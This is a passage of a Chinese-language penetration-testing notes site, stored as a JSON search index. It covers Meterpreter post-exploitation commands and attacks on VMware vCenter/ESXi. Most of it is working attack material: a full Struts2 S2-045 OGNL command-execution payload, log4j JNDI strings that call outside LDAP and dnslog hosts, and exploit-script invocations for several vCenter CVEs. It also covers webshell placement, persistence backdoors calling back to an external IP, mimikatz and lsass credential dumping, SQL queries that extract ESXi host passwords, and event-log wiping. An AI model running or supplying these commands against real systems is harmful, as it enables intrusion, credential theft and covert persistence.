windows/meterpreter/reverse_tcp","title":"\u76d1\u542c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#_4","text":"\u53ef\u4ee5\u5728\u63a5\u6536\u5230seesion\u540e\u7ee7\u7eed\u76d1\u542c\u7aef\u53e3 set ExitOnSession false","title":"\u6301\u7eed\u76d1\u542c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#session","text":"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u4e00\u4e2a\u4f1a\u8bdd\u5c06\u57285\u5206\u949f\uff08300\u79d2\uff09\u6ca1\u6709\u4efb\u4f55\u6d3b\u52a8\uff0c\u90a3\u4e48\u5b83\u4f1a\u88ab\u6740\u6b7b,\u4e3a\u9632\u6b62\u6b64\u60c5\u51b5\u53ef\u5c06\u6b64\u9879\u4fee\u6539\u4e3a0 set SessionCommunicationTimeout 0","title":"\u9632\u6b62session\u8d85\u65f6\u9000\u51fa"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#session_1","text":"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u661f\u671f\uff08604800\u79d2\uff09\u540e\uff0c\u4f1a\u8bdd\u5c06\u88ab\u5f3a\u5236\u5173\u95ed,\u4fee\u6539\u4e3a0\u53ef\u6c38\u4e45\u4e0d\u4f1a\u88ab\u5173\u95ed set SessionExpirationTimeout 0","title":"\u9632\u6b62session\u5f3a\u5236\u5173\u95ed"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#meterpreter","text":"","title":"meterpreter\u7684\u5404\u79cd\u547d\u4ee4"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#_5","text":"cat c:\\boot.ini #\u67e5\u770b\u6587\u4ef6\u5185\u5bb9,\u6587\u4ef6\u5fc5\u987b\u5b58\u5728 del c:\\boot.ini #\u5220\u9664\u6307\u5b9a\u7684\u6587\u4ef6 download nimeia.txt /root/Desktop/ #\u4e0b\u8f7d\u6587\u4ef6\u5230\u672c\u673a\u4e0a edit c:\\boot.ini # \u7f16\u8f91\u6587\u4ef6 getlwd #\u6253\u5370\u672c\u5730\u76ee\u5f55 getwd #\u6253\u5370\u5de5\u4f5c\u76ee\u5f55 lcd #\u66f4\u6539\u672c\u5730\u76ee\u5f55 ls #\u5217\u51fa\u5728\u5f53\u524d\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u5217\u8868 lpwd #\u6253\u5370\u672c\u5730\u76ee\u5f55 pwd #\u8f93\u51fa\u5de5\u4f5c\u76ee\u5f55 cd c:\\\\ #\u8fdb\u5165\u76ee\u5f55\u6587\u4ef6\u4e0b rm file #\u5220\u9664\u6587\u4ef6 mkdir dier #\u5728\u53d7\u5bb3\u8005\u7cfb\u7edf\u4e0a\u7684\u521b\u5efa\u76ee\u5f55 rmdir #\u53d7\u5bb3\u8005\u7cfb\u7edf\u4e0a\u5220\u9664\u76ee\u5f55 dir #\u5217\u51fa\u76ee\u6807\u4e3b\u673a\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u4fe1\u606f mv #\u4fee\u6539\u76ee\u6807\u4e3b\u673a\u4e0a\u7684\u6587\u4ef6\u540d upload /root/backdoor.exe c:\\\\users\\\\arche\\\\AppData\\\\local\\\\backdoor.exe #\u4e0a\u4f20\u6587\u4ef6 search -d d:\\\\www -f web.config #search \u6587\u4ef6\uff0c\u5982search -d c:\\\\ -f*.doc search -f autoexec.bat #\u641c\u7d22\u6587\u4ef6 search -f sea*.bat c:\\\\xamp\\\\","title":"\u6587\u4ef6\u64cd\u4f5c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#_6","text":"load mimakatz #\u4e0d\u7528\u591a\u8bf4 help mimikatz \u67e5\u770b\u5e2e\u52a9 wdigest #\u83b7\u53d6Wdigest\u5bc6\u7801 mimikatz_command -f samdump::hashes #\u6267\u884cmimikatz\u539f\u59cb\u547d\u4ee4 mimikatz_command -f sekurlsa::searchPasswords load powershell #\u6267\u884cpowershell\u547d\u4ee4 load espia #\u622a\u56fe\u7684 load extapi #\u989d\u5916\u6a21\u5757\uff0c\u4e00\u822c\u7528\u4e0d\u5230 load lanattacks #\u5185\u7f51\u653b\u51fb\u6a21\u5757","title":"\u6a21\u5757\u52a0\u8f7d"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#_7","text":"\u5173\u4e8e\u547d\u4ee4\u6267\u884c\uff0c\u53ef\u4f7f\u7528\u8fdb\u5165\u4ea4\u4e92\u5f0fshell\u6267\u884c\u547d\u4ee4\uff0c\u53ef\u4ee5\u52a0\u8f7dpowershell\u6a21\u5757\u6267\u884c\u547d\u4ee4\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528execute\u540e\u53f0\u6267\u884c\uff0c\u5c06\u547d\u4ee4\u653e\u5165channel\u3002\u8fd9\u91cc\u4e3b\u8981\u8bb0\u5f55\u4e00\u4e0bexecute\uff0c\u5728\u63d0\u6743\u65f6\u53ef\u80fd\u6709\u7528\u3002 execute #\u6267\u884ccmd -d \u5728\u76ee\u6807\u4e3b\u673a\u6267\u884c\u65f6\u663e\u793a\u7684\u8fdb\u7a0b\u540d\u79f0\uff08\u7528\u4ee5\u4f2a\u88c5\uff09 -m \u76f4\u63a5\u4ece\u5185\u5b58\u4e2d\u6267\u884c execute -cH -f #c\u662f\u5c06\u547d\u4ee4\u4e22\u5230\u901a\u9053\u4e2d channel -r 4 #\u67e5\u770b\u901a\u9053\u7684\u6267\u884c\u7ed3\u679c use incognito execute -cH -f #\u547d\u4ee4 list_tokens -g impersonate_token 'NT AUTHORITY\\NTLM Authentication' \u4f7f\u7528\u4ee4\u724c steal_token pid \u5077\u4ee4\u724c migrate pid \u6ce8\u5165\u8fdb\u7a0b\\\u8fdb\u7a0b\u8f6c\u79fb","title":"\u547d\u4ee4\u6267\u884c\u3001\u901a\u9053\u3001\u4ee4\u724c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#_8","text":"\u83b7\u53d6\u672c\u5730\u7f51\u7edc run get_local_subnets \u6dfb\u52a0\u8def\u7531 run autoroute -s 10.10.87.0/27 \u7aef\u53e3\u8f6c\u53d1\uff0c\u6307\u5c06\u672c\u673a(\u88ab\u63a7\u673a)\u7684\u7aef\u53e3\u8f6c\u53d1\u5230\u8fdc\u7a0bIP(msf\u670d\u52a1\u7aef)\u7684\u7aef\u53e3 portfwd add -l 3389 -r 192.168.206.200 -p 3389","title":"\u8def\u7531\u53ca\u8f6c\u53d1"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#_9","text":"","title":"\u6743\u9650\u7ef4\u6301\u76f8\u5173"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#persistence","text":"\u8fd9\u4e2a\u540e\u95e8\u5bb9\u6613\u88ab\u6740\uff0c\u53ef\u4ee5\u81ea\u884c\u5199\u5165\u514d\u6740\u7684\u9a6c\u5230\u6ce8\u518c\u8868\u4e2d\u3002\u5f53\u7136\u8981\u5148\u4e0a\u4f20\u9a6c run persistence -X -i 10 -p 6666 -r 103.45.188.176 -X \u7cfb\u7edf\u5f00\u673a\u81ea\u542f -i 10 10\u79d2\u91cd\u8fde\u4e00\u6b21 -p \u76d1\u542c\u7aef\u53e3 -r \u76d1\u542c\u673a\u79fb\u9664 persistence \u540e\u95e8\u7684\u529e\u6cd5\u662f\u5220\u9664 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ \u4e2d\u7684\u6ce8\u518c\u8868\u952e\u548c C:\\WINDOWS\\TEMP\\ \u4e2d\u7684 VBScript \u6587\u4ef6\u3002 reg setval -k HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v backdoor -d c:\\\\users\\\\xxx\\\\AppData\\\\local\\\\backdoor.exe","title":"persistence\u542f\u52a8\u9879\u540e\u95e8"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#metsvc","text":"\u8fd9\u4e2a\u4e5f\u4e0d\u884c\uff0c\u6743\u9650\u7ef4\u6301\u8fd8\u662f\u7528\u5176\u4ed6\u65b9\u6cd5\u6765\u505a\u6bd4\u8f83\u597d run metsvc \u2013A #\u81ea\u52a8\u5b89\u88c5\u540e\u95e8","title":"metsvc\u670d\u52a1\u540e\u95e8"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#rdp","text":"","title":"\u5f00\u542fRDP"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#getgui","text":"run getgui \u2013h #\u67e5\u770b\u5e2e\u52a9 run getgui -e #\u5f00\u542f\u8fdc\u7a0b\u684c\u9762 run getgui -u lltest2 -p 123456 #\u6dfb\u52a0\u7528\u6237 run getgui -f 6661 -e #3389\u7aef\u53e3\u8f6c\u53d1\u52306661 run post/windows/manage/enable_rdp","title":"getgui"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#enable_rdp","text":"run post/windows/manage/enable_rdp #\u5f00\u542f\u8fdc\u7a0b\u684c\u9762 run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=123456 #\u6dfb\u52a0\u7528\u6237 run post/windows/manage/enable_rdp FORWARD=true LPORT=6662 #\u5c063389\u7aef\u53e3\u8f6c\u53d1\u52306662 \u811a\u672c\u4f4d\u4e8e/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb \u901a\u8fc7enable_rdp.rb\u811a\u672c\u53ef\u77e5\uff1a\u5f00\u542frdp\u662f\u901a\u8fc7reg\u4fee\u6539\u6ce8\u518c\u8868\uff1b\u6dfb\u52a0\u7528\u6237\u662f\u8c03\u7528cmd.exe \u901a\u8fc7net user\u6dfb\u52a0\uff1b\u7aef\u53e3\u8f6c\u53d1\u662f\u5229\u7528\u7684portfwd\u547d\u4ee4","title":"enable_rdp\u811a\u672c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#_10","text":"clearev \u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7","title":"\u6e05\u9664\u65e5\u5fd7"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#msfconsole","text":"\u6a21\u5757\u6211\u6ca1\u6709\u8bb0\u5f55\uff0c\u56e0\u4e3a\u5b83\u7684\u6a21\u5757\u90fd\u662f\u5f88\u6709\u89c4\u5219\u7684\uff0c\u4e0d\u9700\u8981\u4e00\u4e2a\u4e2a\u8bb0\u5b83\u3002\u6bd4\u5982\u626b\u63cf\u7c7b\u7684\u90fd\u662fscanner\u6253\u5934\uff0c\u5229\u7528\u7c7b\u7684\u90fd\u662fexploit\u3001misc\u6253\u5934\u3002\u5b9e\u5728\u4e0d\u884c\u8fd8\u6709search\u547d\u4ee4\uff0c\u6240\u4ee5\u8bb0\u6a21\u5757\u6ca1\u7528\uff0c\u8bb0\u4f4f\u5927\u6982\u5c31\u884c\u4e86\u3002 \u4ee5\u4e0a\u3002 ![[Pasted image 20230523150052.png]]","title":"Msfconsole\u4e0b\u7684\u6a21\u5757"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/","text":"\u5b89\u88c5 ESXI\u5b89\u88c5 \u9700\u8981\u5728\u4e00\u4e2a\u672a\u5b89\u88c5\u7cfb\u7edf\u7684\u7535\u8111\uff08\u865a\u62df\u673a\uff09\u4e0a\u5b89\u88c5\uff0c\u5b89\u88c5\u8fc7\u7a0b\u5c31\u662f\u540c\u610f\u540c\u610f\uff0c\u6700\u540e\u8f93\u5165root\u5bc6\u7801\uff0c\u6700\u540e\u767b\u5f55web\u4f7f\u7528web\u754c\u9762\u8fdb\u884c\u7ba1\u7406\u3002 \u5b89\u88c5\u5b8c\u6210\u5982\u56fe\u6240\u793a \u7ba1\u7406\u754c\u9762\u5982\u56fe\u6240\u793a vCenter\u5b89\u88c5 vCenter\u662f\u7528\u6765\u7ba1\u63a7\u591a\u4e2aESXI\u7684\uff0c\u5355\u4e2aESXI\u6ca1\u5fc5\u8981\u4f7f\u7528vCenter\u3002 \u5e38\u89c4\u5b89\u88c5\u65b9\u5f0f\u662f\u9700\u8981\u8fde\u63a5\u5230ESXI\u5b89\u88c5\uff0c\u76f8\u5f53\u4e8e\u5728ESXI\u5b89\u88c5\u4e86\u4e00\u53f0vCenter\u7684\u865a\u62df\u673a\u3002\u76f4\u63a5\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\u5c31\u884c\u4e86\u3002\u7b2c\u4e00\u9636\u6bb5\u4e2d\u7684root\u5bc6\u7801\u662fvCenter\u865a\u62df\u673a\u7684\u5bc6\u7801\uff0c\u7b2c\u4e8c\u9636\u6bb5SSO\u7684\u5bc6\u7801\u662fweb\u7684\u767b\u5f55\u5bc6\u7801\u3002 \u6bd4\u8f83\u7279\u6b8a\u7684\u5b89\u88c5\u65b9\u5f0f\u662f\u5c06vCenter\u4e2d\u7684ova\u6587\u4ef6\u76f4\u63a5\u5bfc\u5165\u5230\u865a\u62df\u673a\u4e2d\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4e0d\u7528\u8fde\u4e0aESXI\uff0c\u9700\u8981\u914d\u7f6e\u4e00\u4e0broot\u5bc6\u7801\u3002 \u5bfc\u5165\u5b8c\u6210\u540e\u8bbf\u95ee5480\u7aef\u53e3\u8fdb\u884c\u914d\u7f6e\uff0c\u914d\u7f6e\u5b8c\u6210\u540e\u53ef\u4ee5\u76f4\u63a5\u767b\u5f55\u3002 \u67e5\u770b\u7248\u672c POST /sdk HTTP/1.1 Host: 192.168.25.137 Cookie: XSRF-TOKEN=LUkPdkLESf6o7foIvzQgQpeGEEVV5mEb; appliance-ui-sessionid=M2QzYzgxZjYtZGQzNy00MmRjLTk4MzYtZjkwNTRlMjRmZGNi; JSESSIONID=AE593F8A3615F7C04EA53A1F13F77F58 Cache-Control: max-age=0 Content-Length: 373 <env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"> <env:Body> <RetrieveServiceContent xmlns=\"urn:vim25\"> <_this type=\"ServiceInstance\">ServiceInstance</_this> </RetrieveServiceContent> </env:Body> </env:Envelope> \u8be6\u7ec6\u7248\u672c\u53f7\u53ef\u5728\u5b98\u7f51\u67e5\u8be2 https://kb.vmware.com/s/article/2143838?lang=zh_CN ESXI\u64cd\u4f5c esxcli network ip interface list esxcli network ip interface ipv4 get -i vmk<X> esxcli network ip interface ipv6 get -n vmk<X> esxcli network ip interface ipv6 address list You can retrieve information about DNS with the esxcli network ip dns command in the following two namespaces: esxcli network ip dns search esxcli network ip dns server For information corresponding to the Linux netstat command, use the following ESXCLI command. esxcli network ip connection list \u6f0f\u6d1e \u4e00\u952e\u5316\u653b\u51fb python2 vCenterExploit.py -s -u https://190.0.0.1:2443 python2 vCenterExploit.py -u https://190.0.0.2:3443 -o unix -c \"id\" python2 vCenterExploit.py -u https://190.0.0.2:2443 -log4j '${jndi:ldap://192.68.25.1:1389/${sys:java.version}}' python2 vCenterExploit.py -u https://190.0.0.2:2443 -shell -o unix -f shell.jsp S2-045 GET /statsreport/ HTTP/1.1 Host: vcenter:443 Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} Connection: close Content-Length: 0 CVE-2021-21972-\u6587\u4ef6\u4e0a\u4f20 \u6f0f\u6d1e\u89e6\u53d1\u70b9 /ui/vropspluginui/rest/services/uploadova \u4e0a\u4f20\u7684\u7269\u7406\u8def\u5f84\u662f /usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/ \u8def\u5f84\u4e0d\u4e00\u5b9a\u901a\u7528\uff0c\u9700\u8981\u679a\u4e3e\u3002 web\u8bbf\u95ee\u8def\u5f84\u662f/ui/resources/xx.jsp \u4f7f\u7528\u811a\u672c\u4e0a\u4f20\u76f4\u63a5\u679a\u4e3e\u8def\u5f84\uff0c\u83b7\u53d6\u7684\u662fui\u6743\u9650\uff0c\u9700\u8981\u63d0\u6743\u5230root\u3002 CVE-2021-21985-JNDI-RCE jndi\u9700\u8981bypass jdk\u7684\u9ad8\u7248\u672c\uff0c\u76f4\u63a5\u811a\u672c\u6253\u3002 \u83b7\u53d6\u7684\u662fui\u6743\u9650\uff0c\u9700\u8981\u63d0\u6743\u5230root CVE-2021-22005-\u6587\u4ef6\u4e0a\u4f20 \u811a\u672c\u76f4\u63a5\u6253\uff0c\u83b7\u53d6\u7684\u662froot\u6743\u9650\u3002\u6587\u4ef6\u4e0a\u4f20\u5230\u4e86 /usr/lib/vmware-sso/vmware-sts/webapps/ROOT/ \u8fd9\u4e2a\u8def\u5f84\u9700\u8981root\u6743\u9650\u624d\u53ef\u64cd\u4f5c\u3002 web\u8bbf\u95ee\u8def\u5f84\u662f/idm/..;/xx.jsp Log4j2 curl --insecure -vv -H \"X-Forwarded-For: \\\\${jndi:ldap://vcentertest.fccszs.dnslog.cn:1389/lol}\" \"https://10.100.100.5/websso/SAML2/SSO/vcenter.lab?SAMLRequest=\" \u672c\u5730\u63d0\u6743 CVE-2021-3156 \u539f\u7248 exploit_defaults_mailer.py.yuanban \u4fee\u6539\u7248 vCenter_privilege_escalation.py \uff0c\u76f4\u63a5\u5728 /usr/lib/vmware-sso/vmware-sts/webapps/openidconnect/ \u5199\u4e00\u4e2awebshell\u3002\u8bbf\u95ee\u8def\u5f84\u662f http://xxxx/vmware-sts/openidconnect/xxx.jsp \u8fdbweb\u540e\u53f0 \u91cd\u7f6eweb\u540e\u53f0\u5bc6\u7801 \u83b7\u53d6root\u6743\u9650\u540e\u4f7f\u7528vmafd-cli\u67e5\u8be2\u57df\u540d vsphere.local \u57df\u7528\u6237\u5728 vCenter 5.5 \u7248\u672c\u4e0a\u7684\u5bc6\u7801\u7a0d\u6709\u53d8\u5316\uff0c\u9700\u8981\u63d0\u4f9b cn=administrator.cn=users.dc=vsphere.dc=local \u7684\u683c\u5f0f\u7684\u5e10\u6237 DN \u800c\u4e0d\u662f\u5e10\u6237 UPN\u3002 \u65e7\u7248\u672c\u7684 vCenter 5.1 \uff0c\u5219\u53ef\u4ee5\u8f6c\u5230 /usr/lib/vmware-sso/utils \u6587\u4ef6\u5939\uff0c\u8fd0\u884c\u547d\u4ee4 ./rsutil reset-admin-password \uff0c\u8f93\u5165\u4e3b\u5bc6\u7801\uff08\u8fd9\u662f root \u5bc6\u7801\uff09\uff0c\u7136\u540e\u8f93\u5165\u8981\u91cd\u7f6e\u7684 SSO \u7ba1\u7406\u5458\u540d\u79f0\uff0c\u4f8b\u5982\uff1a admin \u3002\u51fa\u73b0\u63d0\u793a\u65f6\u952e\u5165\u65b0\u5bc6\u7801\uff0c\u5b83\u5c06\u663e\u793a \"\u5bc6\u7801\u91cd\u7f6e\u6210\u529f\" \u6d88\u606f /usr/lib/vmware-vmafd/bin/vmafd-cli get-domain-name --server-name localhost \u4f7f\u7528 /usr/lib/vmware-vmdir/bin/vdcadmintool \u91cd\u7f6e\u5bc6\u7801 Windows \u7248\u672c\u7684vCenter\u4e0a\uff0c\u4f7f\u7528\u547d\u4ee4\u884c\u5de5\u5177\u8fdb\u5165\u5230 %VMWARE_CIS_HOME%\\vmdird\\ \u76ee\u5f55\u4e0b\uff0c\u6267\u884c vdcadmintool.exe \u7a0b\u5e8f\u3002 linux \u4e00\u53e5\u8bdd\u91cd\u7f6e\uff1a **(echo \"3\"&&sleep 1&&echo \"administrator@vsphere.local\") | /usr/lib/vmware-vmdir/bin/vdcadmintool** Windows\u548cLinux\u90fd\u53ef\u4ee5\u4f7f\u7528python\u811a\u672c\u76f4\u63a5\u91cd\u7f6e vCenterResetPassword.py saml\u8bc1\u4e66\u63d0\u53d6\u53ef\u767b\u5f55\u7684cookie https://github.com/horizon3ai/vcenter_saml_login python-ldap\u6709\u70b9\u641e \u5148\u5b89\u88c5 apt-get install build-essential python3-dev python2.7-dev \\ libldap2-dev libsasl2-dev slapd ldap-utils tox \\ lcov valgrind \u518d\u5b89\u88c5 pip install python-ldap \u627e\u5230data.mdb Linux: Windows \u8fd0\u884c\u83b7\u5f97cookie python3 vcenter_saml_login.py -p data.mdb -t 192.168.25.137 ldap\u7ba1\u7406\u7528\u6237 \u9996\u5148\u9700\u8981\u83b7\u53d6ldap\u7ba1\u7406\u5458\u7684\u5bc6\u7801\u624d\u80fd\u591f\u6dfb\u52a0\u7528\u6237 \u5bc6\u7801\u4fdd\u5b58\u6587\u4ef6\u4f4d\u7f6e # Linux /var/lib/likewise/db/active.db /var/lib/likewise/db/registry.db /storage/service-state/likewise/registry.db # Windows reg query \"HKLM\\SYSTEM\\CurrentControlSet\\services\\VMwareDirectoryService\" /v dcAccount reg query \"HKLM\\SYSTEM\\CurrentControlSet\\services\\VMwareDirectoryService\" /v dcAccountDN reg query \"HKLM\\SYSTEM\\CurrentControlSet\\services\\VMwareDirectoryService\" /v dcAccountPassword \u76f4\u63a5\u67e5\u8be2ldap\u7ba1\u7406\u5458\u5bc6\u7801 /opt/likewise/bin/lwregshell list_values [HKEY_THIS_MACHINE\\\\services\\\\vmdir] vCenterLDAPManage_linux_python3.py \u53ef\u4ee5\u5728\u672c\u5730\u76f4\u63a5\u52a0\u7528\u6237 vCenter_addUser_remotely_python3.py \u53ef\u4ee5\u8fdc\u7a0b\u52a0\u7528\u6237\uff0cLinux\u9700\u8981\u4e0b\u8f7ddb\u6587\u4ef6\uff0cWindows\u9700\u8981\u6307\u5b9a\u5bc6\u7801 \u83b7\u53d6\u865a\u62df\u673a\u6743\u9650 \u4ece\u5feb\u7167\u63d0\u53d6\u865a\u62df\u673a\u7684hash \u5217\u51fa\u865a\u62df\u673a SharpSphere.exe list --url https://192.168.25.134/sdk --username administrator@test.com --password \"!QAZ2wsx\" \u4e0b\u8f7d\u6307\u5b9a\u865a\u62df\u673a\u7684\u5feb\u7167\uff0c\u5982\u4e0d\u5b58\u5728\u5feb\u7167\u9700\u8981\u521b\u5efa \u521b\u5efa\u53ef\u4ee5web\u540e\u53f0\u521b\u5efa\uff0c\u4e5f\u53ef\u4ee5\u7528\u6b64\u5de5\u5177\u521b\u5efa\uff0c\u5728\u4e0b\u8f7d\u540e\u6307\u5b9a --snapshot \u4ee3\u8868\u5148\u521b\u5efa\u4e00\u4e2a\u5feb\u7167\u7136\u540e\u4e0b\u8f7d\u3002 SharpSphere.exe dump --url https://192.168.25.134/sdk --username administrator@test.com --password \"!QAZ2wsx\" --targetvm win10 --destination C:\\Users\\admin\\Desktop\\vcneter \u4e0b\u8f7d\u540e\u4f1a\u751f\u6210\u4e00\u4e2a\u5927\u6587\u4ef6\u548c\u4e00\u4e2a\u5c0f\u6587\u4ef6\uff0c\u4e00\u4e2a4G\u7684\u548c\u4e00\u4e2a3.5M\u7684\uff0c\u5927\u6587\u4ef6\u5927\u5c0f\u8ddf\u5185\u5b58\u6709\u5173\u3002 \u4f7f\u7528 vmss2corex \u6765\u63d0\u53d6 win8\u53ca\u4ee5\u4e0a\u7684\u7cfb\u7edf\u9700\u8981\u52a0 -W8 \u53c2\u6570\uff0c\u5176\u4ed6\u76f4\u63a5 -W \u5148\u6307\u5b9a\u5c0f\u6587\u4ef6\uff0c\u518d\u6307\u5b9a\u5927\u6587\u4ef6 vmss2core-sb-8456865.exe -W8 zs5k2ypj.uhv 1lagz1jn.xae \u5c06\u751f\u6210\u7684dmp\u62d6\u5230windbg\u4e2d\u8c03\u8bd5\u3002 windbg\u6700\u597d\u7528 sdk \u5de5\u5177\u5b89\u88c5\uff0c\u4e0d\u7136\u4f1a\u6709\u95ee\u9898\u3002 \u52a0\u8f7dmimikatz .load C:\\mimilib.dll \u5b9a\u4f4dlsass.exe\u8fdb\u7a0b\u5730\u5740\uff0c\u8fd0\u884cmimikatz 0: kd> !process 0 0 lsass.exe Unable to get program counter PROCESS ffffb408bbedb080 SessionId: 0 Cid: 0260 Peb: 539cc78000 ParentCid: 01d0 DirBase: 11b652000 ObjectTable: ffff860f79142d40 HandleCount: 1135. Image: lsass.exe 0: kd> .process /r /p ffffb408bbedb080 Implicit process is now ffffb408`bbedb080 Loading User Symbols ................................................................ .................... 0: kd> !mimikatz \u6216\u8005\u4e0b\u8f7d\u597d\u5feb\u7167vmem\u6587\u4ef6\u540e\uff0c\u4f7f\u7528volatility\u63d0\u53d6\u3002 volatility_2.6_win64_standalone.exe -f xxx.vmem --profile=\u7cfb\u7edf\u67b6\u6784 lsadump \u5728ESXI\u672c\u5730\u63d0\u53d6hash \u539f\u5219\u4e0a\u8fd8\u662f\u5229\u7528\u5feb\u7167\u63d0\u53d6\uff0c\u53ea\u4e0d\u8fc7\u662f\u5728\u672c\u5730\u76f4\u63a5\u63d0\u53d6\uff0c\u4e0d\u7528\u4e0b\u8f7d\u5feb\u7167\u3002 \u5047\u8bbe\u5f53\u524d\u6709vCenter\u7684\u6743\u9650\uff0c\u4f46\u662f\u5feb\u7167\u5b58\u5728ESXI\u4e0a\u9762\uff0c\u9700\u8981\u83b7\u53d6ESXI\u7684\u6743\u9650\u5e76\u4e14ESXI\u5f00\u542f\u4e86SSH\u670d\u52a1\u3002 \u5982\u679cESXI\u6ca1\u6709\u5f00\u542fssh\uff0c\u53ef\u4ee5\u5728vCenter\u4e2d\u5f00\u542f\u3002 postgresql\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\uff1a C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx /etc/vmware-vpx/vcdb.properties psql -h localhost -d VCDB -U vc \u67e5\u8be2\u865a\u62df\u673a SELECT id,datacenter_id,file_name,guest_os,ip_address,config FROM vc.vpx_vm; \u67e5\u8be2ESXI\u7528\u6237\u5bc6\u7801 SELECT name,username,password,password_last_upd_dt FROM vc.vpxv_hosts; \u4e00\u952e\u67e5\u8be2\u5bfc\u51favpsuser\u7528\u6237\u5bc6\u7801 psql -h 127.0.0.1 -p 5432 -U vc -w HKJrm8yP2)aDWptU -d VCDB -c \"select ip_address,user_name,password from vpx_host;\" > password.enc \u89e3\u5bc6vpxuser\u5bc6\u7801\uff0c\u5982\u679c\u6709root\u5c31\u53ef\u4ee5\u76f4\u63a5\u767b\u5f55root # Windows C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\ssl\\symkey.dat # Linux /etc/vmware-vpx/ssl/symkey.dat \u7ed9\u865a\u62df\u673a\u6253\u597d\u5feb\u7167\u540e\uff0c\u7528volatility\u8bfb\u53d6\u5185\u5b58\u5feb\u7167 ./volatility -f /vmfs/volumes/620b3190-c2d721da-84e5-000c29395ece/win10/win10-Snapshot1.vmem --profile=win1 0x64 hashdump \u6ce8\u610fprofile\u53c2\u6570\u5bf9\u5e94\u7684\u5e73\u53f0 Profiles -------- VistaSP0x64 - A Profile for Windows Vista SP0 x64 VistaSP0x86 - A Profile for Windows Vista SP0 x86 VistaSP1x64 - A Profile for Windows Vista SP1 x64 VistaSP1x86 - A Profile for Windows Vista SP1 x86 VistaSP2x64 - A Profile for Windows Vista SP2 x64 VistaSP2x86 - A Profile for Windows Vista SP2 x86 Win10x64 - A Profile for Windows 10 x64 Win10x64_10586 - A Profile for Windows 10 x64 (10.0.10586.306 / 2016-04-23) Win10x64_14393 - A Profile for Windows 10 x64 (10.0.14393.0 / 2016-07-16) Win10x86 - A Profile for Windows 10 x86 Win10x86_10586 - A Profile for Windows 10 x86 (10.0.10586.420 / 2016-05-28) Win10x86_14393 - A Profile for Windows 10 x86 (10.0.14393.0 / 2016-07-16) Win2003SP0x86 - A Profile for Windows 2003 SP0 x86 Win2003SP1x64 - A Profile for Windows 2003 SP1 x64 Win2003SP1x86 - A Profile for Windows 2003 SP1 x86 Win2003SP2x64 - A Profile for Windows 2003 SP2 x64 Win2003SP2x86 - A Profile for Windows 2003 SP2 x86 Win2008R2SP0x64 - A Profile for Windows 2008 R2 SP0 x64 Win2008R2SP1x64 - A Profile for Windows 2008 R2 SP1 x64 Win2008R2SP1x64_23418 - A Profile for Windows 2008 R2 SP1 x64 